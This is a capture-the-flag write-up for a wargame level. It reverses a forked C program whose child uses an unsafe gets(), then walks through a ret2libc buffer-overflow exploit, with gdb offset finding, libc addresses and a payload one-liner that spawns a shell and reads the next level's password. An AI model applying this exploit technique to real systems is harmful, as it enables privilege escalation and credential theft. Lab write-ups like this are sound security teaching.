# Level 04

<h3>source.c</h3>

```console
int main(void) {
  int   status;     // esp+0x1c
  char  str[128];   // esp+0x20
  int   res         // esp+0xa8
  pid_t pid;        // esp+0xac
  


  pid = fork();
  memset(str, 0, 128);
  res = 0;
  startus = 0;
  if (pid == 0) {
    prctl(1, 1);
    ptrace(0, 0, 0, 0);
    puts("Give me some shellcode, k");
    gets(str);
  }
  else {
    while ((ptrace(3, pid, 44, 0) != 0xb))
    {
      wait(&status);
      if ((status & 0x7f) == 0)
      {
        puts("child is exiting...");
        return (0);
      } 
    }
    puts("no exec() for you");
    kill(pid, 9);
  }
  return (0);
}
```

<h3>Analysis</h3>

Another program that is hard to reverse, this time we have a `fork()` and on of the child `pid == 0` is doing unsafe `gets()`

There is no `.pass` or `system()` can be seen in this program, so we can use `reb2libc` to spawn a shell

Our target this time will be to use the vulnebility of `gets()` to overwrite the return address and point it to `system()` inside `libc`

<h3>Exploit</h3>

First we need to use `set follow-fork-mode child` on gdb to follow a child process, then we can try to find the offset where we could overwrite the return address

```console
(gdb) set follow-fork-mode child
(gdb) r <<< $(python -c "print 'a'*157")
child is exiting...

Starting program: /home/users/level04/level04 <<< $(python -c "print 'a'*157")
[New process 3684]
Give me some shellcode, k

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 3684]
0xf7e40061 in ?? () from /lib32/libc.so.6
(gdb)
```

The offset this time is quite big, and after trying for a while, we can see that the offset of `156 bytes` can reach the return address

Next will be to find the address of `system()` and `/bin/sh` in libc

```console
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
(gdb) x/s 0xf7f897ec
0xf7f897ec:	 "/bin/sh"
```

Great now we have `0xf7e6aed0` as `system()` address and `0xf7f897ec` for `/bin/sh` address

Time to test our exploit

```console
level04@OverRide:~$ (python -c "print 'a' * 156 + '\xd0\xae\xe6\xf7' + 'bbbb' + '\xec\x97\xf8\xf7'"; cat - ) | ./level04
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```